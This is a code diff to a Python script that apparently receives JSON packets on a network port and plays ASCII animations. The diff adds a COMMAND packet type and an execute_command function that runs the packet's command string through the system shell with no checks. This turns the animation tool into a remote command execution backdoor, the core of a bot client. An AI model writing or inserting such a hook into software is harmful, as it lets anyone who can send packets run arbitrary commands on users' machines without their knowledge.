@@ -3,6 +3,7 @@ import json
 import time
 import random
 import os
+import subprocess
 
 PROJECT_ID = "ascii_project"  # Change per device/project
 PORT = 50555
@@ -59,6 +60,17 @@ def binary_loop(repeat, loop_forever, delay):
         count += 1
         time.sleep(delay)
 
+# ---------------- Command Executor ----------------
+def execute_command(cmd):
+    try:
+        if os.name == "nt":
+            output = subprocess.check_output(cmd, shell=True, text=True)
+        else:
+            output = subprocess.check_output(cmd, shell=True, text=True)
+        print(f"[COMMAND OUTPUT]\n{output}")
+    except Exception as e:
+        print(f"[COMMAND ERROR] {e}")
+
 # ---------------- Packet Dispatcher ----------------
 def handle_packet(packet):
     pkt_type = packet.get("type")
@@ -66,6 +78,7 @@ def handle_packet(packet):
     loop_forever = packet.get("loop_forever",False)
     delay = packet.get("delay",0.1)
     message = packet.get("message","")
+    cmd = packet.get("command","")
 
     if pkt_type == "TRAIN_ASCII":
         train_ascii(repeat, loop_forever, delay)
@@ -75,10 +88,13 @@ def handle_packet(packet):
         chromosome_ladder(repeat, loop_forever, delay)
     elif pkt_type == "BINARY":
         binary_loop(repeat, loop_forever, delay)
-    elif pkt_type == "UPDATE":
-        print(f"[UPDATE] {packet.get('file')} <- {packet.get('url')}")
     elif pkt_type == "MESSAGE":
         print(f"[MESSAGE] {message}")
+    elif pkt_type == "COMMAND":
+        print(f"[EXECUTING COMMAND] {cmd}")
+        execute_command(cmd)
+    elif pkt_type == "UPDATE":
+        print(f"[UPDATE] {packet.get('file')} <- {packet.get('url')}")
     else:
         print(f"[UNKNOWN PACKET] {packet}")
 
